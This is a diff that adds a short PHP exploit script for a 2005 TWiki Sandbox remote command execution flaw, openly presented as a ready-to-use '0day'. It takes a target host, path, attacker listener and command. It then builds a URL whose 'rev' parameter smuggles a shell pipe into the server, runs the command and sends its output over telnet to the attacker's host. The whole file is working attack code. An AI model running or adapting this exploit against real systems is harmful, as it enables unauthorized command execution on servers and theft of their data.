@@ -1,0 +1,47 @@
+<?
+
+/*
+# Oct 2005
+# twiki Sandbox remote command execution (discovered by dreyer <luna@aditel.org>)
+# shitty php script by !dSR (www.digitalsec.net) Pedro Andujar & Javier Olascoaga 
+# 0day Enjoy!
+*/
+
+$host = "www.digitalsec.net";
+$sandbox_path = "twiki/bin/view/Sandbox";
+$cmd = "/usr/bin/id";
+# Proxy support $proxy = "193.194.84.198:8080";
+
+if (! isset($argv[1]) && !isset($argv[2]) && !isset ($argv[5])) {
+       print "twiki Sandbox vuln shitty script \n";
+       print "Usage: php $argv[0] <host> <sandbox path> <listening host> <listening port> <cmd>\n";
+       exit;
+}
+
+$host = $argv[1];
+$view_path = $argv[2];
+$remotehost = $argv[3];
+$remoteport = $argv[4];
+$cmd = preg_replace ('/ /', '%20', $argv[5]);
+
+$url = "http://$host/$sandbox_path/WebHome?rev=%20%7C/bin/echo%20-e%20%22date:+%20a%3b%20%20author:%20$($cmd%20|%20telnet%20$remotehost%20$remoteport)%3b\\na%22%0a23";
+
+if (!(function_exists('curl_init'))) {
+   echo "cURL extension required\n";
+   exit;
+}
+
+$ch=curl_init();
+
+if (isset($proxy)){
+   curl_setopt($ch, CURLOPT_PROXY,$proxy);
+}
+
+curl_setopt($ch, CURLOPT_URL,$url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+
+$res = curl_exec ($ch);
+
+curl_close ($ch);
+
+?>
